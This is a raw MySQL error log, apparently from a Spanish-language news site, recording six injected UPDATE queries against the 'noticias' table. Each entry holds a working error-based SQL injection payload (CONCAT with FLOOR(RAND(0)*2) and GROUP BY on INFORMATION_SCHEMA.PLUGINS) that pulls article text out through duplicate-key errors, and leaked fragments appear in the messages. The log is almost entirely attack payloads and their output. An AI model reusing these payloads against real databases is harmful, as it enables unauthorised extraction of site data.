+Time : 20:15:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqnas de miles de litros en los últimos meses evitándoleqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3837 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo4 AS CHAR),0x20)),217,54) FROM delbd.noticias ORDER BY id LIMIT 1495,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3105 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ciudad AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 4996,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqhiapaneco que se opone a la reforma educativa. qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7380 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),109,54) FROM delbd.noticias ORDER BY id LIMIT 2993,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqLes dice ratas a los panistas frente a evento de Javieqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4440 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 1995,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1051 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 494,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3031 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 495,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
